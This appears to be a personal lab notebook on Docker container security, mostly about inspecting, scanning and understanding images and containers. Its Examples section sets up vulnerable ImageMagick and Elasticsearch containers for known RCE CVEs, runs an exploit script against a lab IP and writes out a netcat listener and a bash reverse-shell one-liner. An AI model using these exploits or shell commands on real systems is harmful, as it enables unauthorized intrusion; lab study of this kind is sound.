
# Dockerfile build & run

```bash
docker build --no-cache -f Dockerfile -t <image_name>:<tag> .

docker run --rm -d <image_name>:<tag>
```


---------------------------------------------------------------------------------------------------


# Dockerfile and Resources

### OWASP Docker Top 10

https://github.com/OWASP/Docker-Security/blob/main/dist/owasp-docker-security.pdf

Containers threat model: Compromising Secrets, Network, DoS, Poisoned Images, Container Escape, Kernel Exploits.

### OWASP Docker Security Cheat Sheet

https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html

### Dockerfile best practices

https://docs.docker.com/develop/develop-images/dockerfile_best-practices/

### Top 20 Dockerfile best practices

https://sysdig.com/blog/dockerfile-best-practices/

### Container Security Best practices

https://sysdig.com/blog/container-security-best-practices/

### ...


---------------------------------------------------------------------------------------------------

# Examples

1) ImageMagick RCE CVE-2016-3714

https://github.com/mike-williams/imagetragick-poc

```bash 
docker build -f Dockerfile -t magick .
docker run -d -p 3000:3000 magick
```

From the host, browse to `<vm_ip>:3000`. 

To exploit the RCE, read: https://imagetragick.com/


2) Elasticsearch 1.4.2 RCE CVE-2015-1427

https://github.com/t0kx/exploit-CVE-2015-1427
https://www.exploit-db.com/exploits/36337

From the Ubuntu VM:

```bash
docker build -t elasticsearch .

docker run --rm -d -p 9200:9200 elasticsearch
```

From the host (/Desktop/repos/Exploit folder):

```bash
pipenv shell

python2 elc_rce.py 172.16.3.10
```


To get a shell
 1) Set up a listener in the guest VM: `nc -nlvp 1234`

 CHECK METASPLOIT PAYLOAD BECAUSE THIS DOESN'T WORK

 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp

 2) Run the following command: `bash -i >& /dev/tcp/172.16.3.10/1234 0>&1`



## (Docker) Image storage

MacOS: `~/Library/Containers/com.docker.docker/Data/vms/0/`

Linux: `/var/lib/docker`

If you use the default storage driver overlay2, then your Docker images are stored in `/var/lib/docker/overlay2`. More info about storage drivers here: https://docs.docker.com/storage/storagedriver/select-storage-driver/


## Docker pull

```bash
docker pull <image>
```

The just downloaded image will be in `/var/lib/docker/overlay2/<???>`



## Save a Docker image as a tar file

To save an image into a tar file:
```bash
docker save <image_id> -o <image_name>.tar
```

To view the image folder structure, you can run:
```bash
tree .
```


## OCI Images

Retrieve OCI images with Skopeo.



## Extract the Dockerfile from an image

### chenzj/dfimage

https://github.com/LanikSJ/dfimage
https://hub.docker.com/r/chenzj/dfimage/

```bash
alias dfimage="docker run -v /var/run/docker.sock:/var/run/docker.sock --rm chenzj/dfimage"
dfimage <image_id>
```


### Docker history

```bash
docker history --no-trunc <image_id>
```


### A bash alternative

```bash
docker history --no-trunc $argv  | tac | tr -s ' ' | cut -d " " -f 5- | sed 's,^/bin/sh -c #(nop) ,,g' | sed 's,^/bin/sh -c,RUN,g' | sed 's, && ,\n  & ,g' | sed 's,\s*[0-9]*[\.]*[0-9]*\s*[kMG]*B\s*$,,g' | head -n -1
```

### Dedockify

https://github.com/mrhavens/Dedockify


## Create OCI bundles from Docker Images

https://chromium.googlesource.com/external/github.com/docker/containerd/+/refs/tags/v0.2.0/docs/bundle.md

```bash
docker create --name <tempname> <image_id>

mkdir rootfs
docker export <tempname> | tar -C rootfs -xf -

docker rm <tempname>

runc spec
```

Or in one line:

```bash
sudo bash -c 'docker export $(docker create <image>) | tar -C rootfs -xvf -'
```


Now you have a rootfs directory and a config.json file.


## Alternative Tools

Alternative tools to retrieve and deal with (Docker) images.

### Skopeo

Installation: https://github.com/containers/skopeo/blob/main/install.md#ubuntu

Skopeo is a tool that allows to fetch a Docker image (from a registry, local daemon or eevn from a file saved with `docker save`) and convert it to an OCI image (and viceversa). Given that the OCI spec was based on the Docker image format, there is no loss of information when converting between the two formats.

```bash
skopeo copy docker://debian:latest oci:debian:latest

skopeo copy --override-os linux docker://ubuntu:bionic oci-archive:ubuntu.tar
```


### Umoci

With umoci, we can upack an OCI image to make an OCI runtime. Then, we can run the container with `runc`.

```bash
umoci unpack --image debian:latest debian_bundle
```

To run a container with runc:

```bash
runc run <container_name>
```

## Dive - inspect a Docker image

https://github.com/wagoodman/dive

```bash
dive <image_id>
```


## Image SBOM

Using `Anchore syft` (https://github.com/anchore/syft), we can retrieve a SBOM of the container image:

```bash
syft packages <path/to/oci_image_folder>

syft <image_id>

syft <image_id> -o json | jq '.artifacts[] | select(.name == "elasticsearch")
```

Information: 
 - number of packages
 - name, version, type (e.g. deb or python)

Check also the section below for retrieving installed packages.


### Image Scanning

Anchore grype https://github.com/anchore/grype

```bash
grype <image_id> 

grype <image_id> --scope --all-layers

trivy image <image_id>
```


## OCI Image config.json

Retrivable information:

 - User (uid, gid)
 - List of Linux capabilities (e.g. CAP_KILL, CAP_NET_BIND_SERVICE, ..)
 - hostname
 - mount points
 - image.created date
 - namespaces (e.g. pid, network, ipc, uts, mount)


## Dockerfile fields

From: https://docs.docker.com/engine/reference/builder/

 - FROM
 - RUN
 - CMD
 - LABEL
 - MAINTAINER (deprecated)
 - EXPOSE
 - ENV
 - ADD
 - COPY
 - ENTRYPOINT
 - VOLUME
 - USER
 - WORKDIR
 - ARG
 - ONBUILD
 - STOPSIGNAL
 - HEALTHCHECK
 - SHELL



## Docker run parameters


How to retrive the `docker run` command from a running container?


### Privileged Containers

To get a list of containers running with the --privileged flag:

```bash
docker ps --quiet --all | xargs docker inspect --format '{{ .Id }}: Privileged={{ .HostConfig.Privileged }}'
```

### Mounted Directories

```bash
docker ps --quiet --all | xargs docker inspect --format '{{ .Id }}: Volumes={{ .Mounts }}'
```

The following directories should not be mounted: /, /boot, /dev, /etc, /lib, /proc, /sys, /usr.







## Container Layer (merged directory)

To get the merged directory (i.e. container layer) of a running container, you can run the following:

```bash
docker exec <image_id> mount | grep diff

docker inspect <image_name> | jq .[0].GraphDriver.Data
```

From the latest command's output:
 - _LowerDir_: Is the directory with read-only image layers separated by colons.
 - _MergedDir_: Merged view of all the layers from image and container.
 - _UpperDir_: Read-write layer where changes are written.
 - _WorkDir_: Working directory used by Linux OverlayFS to prepare merged view.


### Installed packages

Depending on your system you may want to run the following:

```bash

(docker exec <id> ) apt list --installed

(docker exec <id> ) dpkg -l

(docker exec <id> ) rpm -qa

```





## Get a container PID (from Host point of view)

https://stackoverflow.com/questions/34878808/finding-docker-container-processes-from-host-point-of-view


```bash
docker inspect -f '{{.State.Pid}}' <container id>
```


## Linux Process Monitoring

```bash
docker container top <id>
```

To check no SSH server is running within a container:

```bash
docker exec $INSTANCE_ID ps -el
```




## Get container open ports

```bash
docker container port <id>

docker ps --quiet | xargs docker inspect --format '{{ .Id }}: Ports={{ .NetworkSettings.Ports }}'
```


## Get container established connection


```bash
docker exec -it <id> sh -c "netstat -an" 
```



## Get container Open File Descriptors

A file descriptor is a number that uniquely identifies an open file in a computer's operating system. It describes a data resource, and how that resource may be accessed. When a program asks to open a file — or another data resource, like a network socket — the kernel:
   - Grants access.
   - Creates an entry in the global file table.
   - Provides the software with the location of that entry.

We can detect a reverse shell by listing the open file descriptors on a container.
It requires that `lsof` is installed on the system.

```bash
docker exec -it <id> sh -c "lsof -i"
```


## Get container Mount points

```bash
docker exec -it <id> sh -c "cat /proc/mounts"

docker inspect -f '{{ .Mounts }}' <id>
```


## Network Namespace

```bash
docker ps --quiet --all | xargs docker inspect --format '{{ .Id }}: NetworkMode={{ .HostConfig.NetworkMode }}'
```



## AppArmor

To retrieve an AppArmor profile for each container:

```bash
 docker ps --quiet --all | xargs docker inspect --format '{{ .Id }}: AppArmorProfile={{ .AppArmorProfile }}'
```

By default, the docker-default AppArmor profile is applied to running containers. This profile can be found at `/etc/apparmor.d/docker`.


## SELinux

```bash
 docker ps --quiet --all | xargs docker inspect --format '{{ .Id }}: SecurityOpt={{ .HostConfig.SecurityOpt }}'
```


## Linux Capabilities

Docker supports the addition and removal of capabilities. You should remove all capabilities not required for the correct function of the container. Specifically, in the default capability set provided by Docker, the NET_RAW capability should be removed if not explicitly required, as it can give an attacker with access to a container the ability to create spoofed network traffic.

```bash
 docker ps --quiet --all | xargs docker inspect --format '{{ .Id }}: CapAdd={{ .HostConfig.CapAdd }} CapDrop={{ .HostConfig.CapDrop }}'
```






## Intercept container traffic (mitmproxy)

https://stackoverflow.com/questions/31272002/running-docker-container-through-mitmproxy
https://blog.heckel.io/2013/07/01/how-to-use-mitmproxy-to-read-and-modify-https-traffic-of-your-phone/












# Useful Tools

 - GoogleCloudPlatform/gcpviz https://github.com/GoogleCloudPlatform/professional-services/tree/master/tools/gcpviz
   gcpviz is a visualization tool that takes input from Cloud Asset Inventory (from Google), creates relationships between assets and outputs a format compatible with graphviz. You can use it to visualize all resources in the export (examples are provided for the basic use cases).
   - **graphviz**: Graphviz is open source graph visualization software. Graph visualization is a way of representing structural information as diagrams of abstract graphs and networks. It has important applications in networking, bioinformatics, software engineering, database and web design, machine learning, and in visual interfaces for other technical domains.
   **__We could use this library to build a visualization of a K8s cluster/policies/etc.__**

 - GoogleContainerTools/container-diff https://github.com/GoogleContainerTools/container-diff
   container-diff is a tool for analyzing and comparing container images.
  
 - DockerSlim https://github.com/docker-slim/docker-slim
   docker-slim will optimize and secure your containers by understanding your application and what it needs using various analysis techniques. It will throw away what you don't need, reducing the attack surface of your container. 

 - Portshift/Kubei https://github.com/Portshift/Kubei
   Kubei is a vulnerabilities scanning and CIS Docker benchmark tool that allows users to get an accurate and immediate risk assessment of their kubernetes clusters. Kubei scans all images that are being used in a Kubernetes cluster, including images of application pods and system pods. It doesn’t scan the entire image registries and doesn’t require preliminary integration with CI/CD pipelines.

 - Simuland https://github.com/OTRF/SimuLand
   An initiative from the Open Threat Research (OTR) community to share cloud templates and scripts to deploy network environments to simulate adversaries, generate/collect data and learn more about adversary tradecraft from a defensive perspective. The difference with other environments is that we do not have one scenario to cover all use-cases, but multiple modular environments that adapt to specific topics of research.
   https://www.microsoft.com/security/blog/2021/08/05/sharing-the-first-simuland-dataset-to-expedite-research-and-learn-about-adversary-tradecraft/


# Resources

 - Modeling and Discovering Vulnerabilities with Code Property Graphs
   https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&arnumber=6956589

 - Pattern-Based Vulnerability Discovery
   https://ediss.uni-goettingen.de/bitstream/handle/11858/00-1735-0000-0023-9682-0/mainFastWeb.pdf

 - VIATRA - graph transformation
   https://www.eclipse.org/viatra/documentation/tutorial.html


# General knowledge

## Why Docker uses layers?

The layers have a couple advantages. First, they are immutable. Once created, that layer identified by a sha256 hash will never change. That immutability allows images to safely build and fork off of each other. If two dockerfiles have the same initial set of lines, and are built on the same server, they will share the same set of initial layers, saving disk space. That also means if you rebuild an image, with just the last few lines of the Dockerfile experiencing changes, only those layers need to be rebuilt and the rest can be reused from the layer cache. This can make a rebuild of docker images very fast.

Inside a container, you see the image filesystem, but that filesystem is not copied. On top of those image layers, the container mounts it's own read-write filesystem layer. Every read of a file goes down through the layers until it hits a layer that has marked the file for deletion, has a copy of the file in that layer, or the read runs out of layers to search through. Every write makes a modification in the container specific read-write layer.


## Union File System

https://martinheinz.dev/blog/44

Union file system works on top of the other file-systems. It gives a single coherent and unified view of files and directories of separate file-systems. In other words, it mounts multiple directories to a single root. It is more of a mounting mechanism than a file system.
   - Mounting is the process by which you make a filesystem available to the system. After mounting your files will be accessible under the mount-point.

UnionFS, AUFS, OverlayFS are the few popular examples of the union file system.

 - **copy-on-write (CoW)**: CoW is an optimization technique where if two callers ask for the same resource, you can give them pointer to the same resource without copying it. Copying becomes necessary only when one of the callers attempts to write to their "copy" - hence the term copy on (first attempt to) write. In the case we try to modify a shared file (or read-only file) -- i.e. modifying a file within a container, it first gets copied up to the top writeable branch (upperdir) which has higher priority than read-only lower branches (lowerdir). Then - when it's in the writeable branch - it can be safely modified and it's new content will be visible in merged view because the top layer has higher priority. 

Last operation that we might want to perform is **deletion** of files. To perform "deletion", a whiteout file is created in writeable branch to clear the file which we want deleted. This means that the file isn't actually deleted, but rather hidden in the merged view. 


### Overlay2

By default, Docker uses the overlay2 UFS: https://docs.docker.com/storage/storagedriver/overlayfs-driver/#how-the-overlay2-driver-works

OverlayFS layers two directories on a single Linux host and presents them as a single directory. These directories are called layers and the unification process is referred to as a union mount. OverlayFS refers to the lower directory as lowerdir and the upper directory a upperdir. The unified view is exposed through its own directory called merged.

The lowest layer contains a file called link, which contains the name of the shortened identifier, and a directory called diff which contains the layer’s contents. The second-lowest layer, and each higher layer, contain a file called lower, which denotes its parent, and a directory called diff which contains its contents. It also contains a merged directory, which contains the unified contents of its parent layer and itself, and a work directory which is used internally by OverlayFS.